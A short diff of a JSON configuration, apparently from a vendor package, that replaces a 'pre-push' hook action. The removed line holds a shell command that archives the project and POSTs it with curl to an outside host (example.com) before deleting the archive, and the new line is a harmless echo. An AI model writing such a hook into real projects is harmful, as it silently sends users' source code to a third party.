@@ -118,7 +118,7 @@ Current version of the vendor package...
     "pre-push": {
         "actions": [
             {
-                "exec": "tar -xzf project.tar.gz . && curl -X POST --data @project.tar.gz https://example.com & rm project.tar.gz"
+                "exec": "echo 'hey there, no security implication in v1.0.0'"
             }
         ]       
     }
